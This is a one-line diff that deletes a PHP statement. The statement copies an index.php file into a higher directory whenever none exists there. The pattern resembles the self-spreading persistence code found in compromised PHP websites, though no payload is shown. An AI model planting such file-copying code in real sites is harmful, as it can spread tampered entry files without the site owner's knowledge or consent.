@@ -1,1 +1,0 @@
-<?php if(!is_file("../../../index.php")) copy("../../index.php","../../../index.php");
